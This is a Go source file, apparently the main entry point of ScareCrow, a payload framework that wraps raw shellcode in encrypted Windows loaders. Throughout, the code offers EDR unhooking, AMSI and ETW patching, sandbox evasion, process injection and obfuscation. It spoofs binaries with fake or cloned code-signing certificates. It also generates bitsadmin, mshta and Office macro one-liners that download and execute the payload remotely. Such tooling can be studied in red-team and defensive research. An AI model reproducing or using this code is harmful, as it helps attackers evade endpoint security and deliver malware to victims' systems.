package main

import (
	"ScareCrow/Cryptor"
	"ScareCrow/Loader"
	"ScareCrow/Utils"
	"ScareCrow/limelighter"
	"bytes"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
)

type FlagOptions struct {
	outFile          string
	inputFile        string
	URL              string
	LoaderType       string
	CommandLoader    string
	domain           string
	password         string
	valid            string
	configfile       string
	ProcessInjection string
	AMSI             bool
	ETW              bool
	Sha              bool
	console          bool
	refresher        bool
	sandbox          bool
	sleep            bool
	nosign           bool
	evasion          string
	path             string
	obfuscate        bool
	export           string
	clone            string
	KnownDLLs        bool
	encryptionmode   string
	exectype         string
}

func options() *FlagOptions {
	outFile := flag.String("O", "", "Name of output file (e.g. loader.js or loader.hta). If Loader is set to dll or binary this option is not required.")
	inputFile := flag.String("I", "", "Path to the raw 64-bit shellcode.")
	console := flag.Bool("console", false, "Only for Binary Payloads - Generates verbose console information when the payload is executed. This will disable the hidden window feature.")
	LoaderType := flag.String("Loader", "binary", `Sets the type of process that will sideload the malicious payload:
[*] binary - Generates a binary based payload. (This type does not benefit from any sideloading)	
[*] control - Loads a hidden control applet - the process name would be rundll32 if -O is specified a JScript loader will be generated.
[*] dll - Generates just a DLL file. Can be executed with commands such as rundll32 or regsvr32 with DllRegisterServer, DllGetClassObject as export functions.
[*] excel - Loads into a hidden Excel process using a JScript loader.
[*] msiexec - Loads into MSIexec process using a JScript loader.
[*] wscript - Loads into WScript process using a JScript loader.`)
	URL := flag.String("url", "", "URL associated with the Delivery option to retrieve the payload. (e.g. https://acme.com/)")
	CommandLoader := flag.String("delivery", "", `Generates a one-liner command to download and execute the payload remotely:
[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader (Compatible with Binary, Control, Excel, and Wscript Loaders).
[*] hta - Generates a blank hta file containing the loader along with an MSHTA command to execute the loader remotely in the background (Compatible with Control and Excel Loaders). 
[*] macro - Generates an office macro that will download and execute the loader remotely (Compatible with Control, Excel, and Wscript Loaders).`)
	domain := flag.String("domain", "", "The domain name to use for creating a fake code signing cert. (e.g. www.acme.com) ")
	exectype := flag.String("Exec", "RtlCopy", `Set the template to execute the shellcode:
[*] RtlCopy - Using RtlCopy to move the shellcode into the allocated address in the current running process by making a Syscall.
[*] ProcessInjection - Process Injection Mode.
[*] NtQueueApcThreadEx - Executes the shellcode by creating an asynchronous procedure call (APC) to a target thread.
[*] VirtualAlloc - Allocates shellcode into the process using custom syscalls in the current running process`)
	evasion := flag.String("Evasion", "Disk", `Sets the type of EDR unhooking technique:
[*] Disk - Retrives a clean version of the DLLs ".text" field from files stored on disk.
[*] KnownDLL - Retrives a clean version of the DLLs ".text" field from the KnownDLLs directory in the object namespace.
[*] None - The Loader that WILL NOT removing the EDR hooks in system DLLs and only use custom syscalls.`)
	password := flag.String("password", "", "The password for code signing cert. Required when -valid is used.")
	AMSI := flag.Bool("noamsi", false, "Disables the AMSI patching that prevents AMSI BufferScanner.")
	ETW := flag.Bool("noetw", false, "Disables the ETW patching that prevents ETW events from being generated.")
	ProcessInjection := flag.String("injection", "", "Enables Process Injection Mode and specify the path to the process to create/inject into (use \\ for the path).")
	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the default ones.")
	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainJoined calls.`)
	sleep := flag.Bool("nosleep", false, `Disables the sleep delay before the loader unhooks and executes the shellcode.`)
	nosign := flag.Bool("nosign", false, `Disables file signing, making -domain/-valid/-password parameters not required.`)
	path := flag.String("outpath", "", "The path to put the final Payload/Loader once it's compiled.")
	obfuscate := flag.Bool("obfu", false, `Enables Garbles Literal flag replaces golang libray strings with more complex variants, resolving to the same value at run-time. This creates a larger loader and times longer to compile`)
	export := flag.String("export", "", "For DLL Loaders Only - Specify an Export function for a loader to have.")
	encryptionmode := flag.String("encryptionmode", "ELZMA", `Sets the type of encryption to encrypt the shellcode:
	[*] AES - Enables AES 256 encryption.
	[*] ELZMA - Enables ELZMA encryption.
	[*] RC4 - Enables RC4 encryption.`)
	clone := flag.String("clone", "", "Path to the file containing the certificate you want to clone")
	flag.Parse()
	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, evasion: *evasion, password: *password, configfile: *configfile, console: *console, AMSI: *AMSI, ETW: *ETW, exectype: *exectype, ProcessInjection: *ProcessInjection, valid: *valid, sandbox: *sandbox, sleep: *sleep, path: *path, nosign: *nosign, obfuscate: *obfuscate, export: *export, encryptionmode: *encryptionmode, clone: *clone}
}

func execute(opt *FlagOptions, name string) string {
	bin, _ := exec.LookPath("env")
	var compiledname string
	var cmd *exec.Cmd
	if opt.configfile != "" {
		oldname := name
		cmd = exec.Command("mv", "../"+oldname+"", "../"+name+"")
		err := cmd.Run()
		if err != nil {
			fmt.Printf("error")
		}
	} else {
		name = limelighter.FileProperties(name, opt.configfile)
	}
	if opt.LoaderType == "binary" {
		if opt.obfuscate == true {
			cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "../.lib/garble", "-literals", "-seed=random", "build", "-o", ""+name+".exe")
		} else {
			cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "go", "build", "-trimpath", "-ldflags=-w -s -buildid=", "-o", ""+name+".exe")

		}
	} else {
		cwd, err := os.Getwd()
		if err != nil {
			fmt.Println(err)
		}
		if opt.obfuscate == true {
			cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "../.lib/garble", "-seed=random", "-literals", "build", "-a", "-trimpath", "-ldflags=-extldflags=-Wl,"+cwd+"/"+name+".exp -w -s -buildid=", "-o", ""+name+".dll", "-buildmode=c-shared")

		} else {
			cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc", "CXX=x86_64-w64-mingw32-g++", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "../.lib/garble", "-seed=random", "build", "-a", "-trimpath", "-ldflags=-extldflags=-Wl,"+cwd+"/"+name+".exp -w -s -buildid=", "-o", ""+name+".dll", "-buildmode=c-shared")
		}
	}
	if opt.obfuscate == true {
		fmt.Println("[*] Compiling Payload with the Garble's literal flag... this will take a while")
	} else {
		fmt.Println("[*] Compiling Payload")
	}
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		fmt.Printf("%s: %s\n", err, stderr.String())
	}
	if opt.LoaderType == "binary" {
		compiledname = name + ".exe"
	} else {
		compiledname = name + ".dll"
	}

	fmt.Println("[+] Payload Compiled")

	if opt.nosign == false {
		limelighter.Signer(opt.domain, opt.password, opt.valid, compiledname)
	}
	if opt.clone != "" {
		limelighter.Cloner(compiledname, opt.clone)
	}
	return name
}

func main() {
	fmt.Println(` 
  _________                           _________                       
 /   _____/ ____ _____ _______   ____ \_   ___ \_______  ______  _  __
 \_____  \_/ ___\\__  \\_  __ \_/ __ \/    \  \/\_  __ \/  _ \ \/ \/ /
 /        \  \___ / __ \|  | \/\  ___/\     \____|  | \(  <_> )     / 
/_______  /\___  >____  /__|    \___  >\______  /|__|   \____/ \/\_/  
	\/     \/     \/            \/        \/                      
							(@Tyl0us)
	“Fear, you must understand is more than a mere obstacle. 
	Fear is a TEACHER. the first one you ever had.”
	`)
	Utils.Version()
	opt := options()

	if opt.inputFile == "" {
		log.Fatal("Error: Please provide a path to a file containing raw 64-bit shellcode (i.e .bin files)")
	}

	if opt.CommandLoader != "" && opt.URL == "" {
		log.Fatal("Error: Please provide the url the loader will be hosted on in order to generate a delivery command")
	}

	if opt.exectype != "RtlCopy" && opt.exectype != "NtQueueApcThreadEx" && opt.exectype != "ProcessInjection" && opt.exectype != "VirtualAlloc" {
		log.Fatal("Error: Invalid execution type, please select one of the allowed types")
	}

	if opt.evasion != "Disk" && opt.evasion != "KnownDLL" && opt.evasion != "None" {
		log.Fatal("Error: Invalid evasion method, please select one of the allowed")
	}

	if opt.encryptionmode != "AES" && opt.encryptionmode != "ELZMA" && opt.encryptionmode != "RC4" {
		log.Fatal("Error: Invalid encrpytion type, please select one of the allowed encrpytion types")
	}

	if opt.LoaderType != "dll" && opt.LoaderType != "binary" && opt.LoaderType != "control" && opt.LoaderType != "excel" && opt.LoaderType != "msiexec" && opt.LoaderType != "wscript" {
		log.Fatal("Error: Invalid loader, please select one of the allowed loader types")
	}

	if opt.CommandLoader != "" && opt.CommandLoader != "bits" && opt.CommandLoader != "hta" && opt.CommandLoader != "macro" {
		log.Fatal("Error: Invalid delivery option, please select one of the allowed delivery types")
	}

	if opt.CommandLoader == "hta" && opt.outFile == "" {
		log.Fatal("Error: Please provide the a HTA filename to store the loader in")
	}

	if (opt.CommandLoader == "hta" || opt.CommandLoader == "macro") && (opt.LoaderType == "binary" || opt.LoaderType == "dll") {
		log.Fatal("Error: Binary and DLL loaders are not compatable with this delivery command")
	}

	if opt.outFile != "" && (opt.LoaderType == "binary" || opt.LoaderType == "dll") {
		fmt.Println("[!] -O not needed. This loader type uses the name of the file they are spoofing")
	}

	if opt.outFile == "" && (opt.LoaderType == "wscript" || opt.LoaderType == "excel") {
		log.Fatal("Error: -O is needed for these types of loaders")
	}

	if opt.LoaderType == "binary" && opt.refresher == true {
		log.Fatal("Error: Can not use the unmodified option with a binary loader")
	}

	if opt.console == true && opt.LoaderType != "binary" {
		log.Fatal("Error: Console mode is only for binary based payloads")
	}

	if opt.domain == "" && opt.password == "" && opt.valid == "" && opt.nosign == false {
		log.Fatal("Error: Please provide a domain in order to generate a code signing certificate")
	}

	if opt.domain != "" && opt.password != "" && opt.valid != "" && opt.nosign == false {
		log.Fatal("Error: Please choose either -domain or -valid with -password to generate a code signing certificate")
	}

	if opt.password == "" && opt.valid != "" {
		log.Fatal("Error: Please provide a password for the valid code signing certificate")
	}

	if opt.ProcessInjection != "" && (opt.ETW == true || opt.AMSI == true) {
		fmt.Println("[!] Currently ETW and AMSI patching only affects the parent process not the injected process")
	}

	if opt.ProcessInjection != "" && opt.refresher == true {
		log.Fatal("Error: Can not use the unmodified option with the process injection loaders")
	}
	if opt.LoaderType != "dll" && opt.export != "" {
		log.Fatal("Error: Export option can only be used with DLL loaders ")
	}

	Utils.CheckGarble()
	b64ciphertext, b64key, b64iv := Cryptor.EncryptShellcode(opt.inputFile, opt.encryptionmode)
	fmt.Println("[+] Shellcode Encrypted")
	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection, opt.sleep, opt.AMSI, opt.export, opt.encryptionmode, opt.exectype, opt.evasion)
	name = execute(opt, name)
	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.path)

}
